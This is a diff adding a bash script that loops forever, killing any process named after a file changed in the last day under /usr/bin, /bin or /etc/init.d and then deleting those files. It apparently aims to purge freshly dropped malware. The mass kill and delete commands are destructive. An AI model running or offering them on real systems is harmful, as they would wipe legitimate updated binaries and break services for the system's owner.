@@ -1,0 +1,13 @@
+#!/bin/bash
+while :                                                                                                                                                                                         
+do                                                                                                                                                                                              
+processname=`find /usr/bin -type f -mtime -1 | tr '/' ' ' | awk '{print $3}'`                                                                                                                   
+processname3=`find /etc/init.d -type f -mtime -1 | tr '/' ' ' | awk '{print $3}'`                                                                                                               
+processname2=`find /bin -type f -mtime -1 | tr '/' ' ' | awk '{print $3}'`                                                                                                                      
+killall -9 $processname $processname2 $processname3
+find /usr/bin -type f -mtime -1 -exec rm {} \;
+find /bin -type f -mtime -1 -exec rm {} \;
+find /etc/init.d -type f -mtime -1 -exec rm {} \;
+sleep 2
+done
+
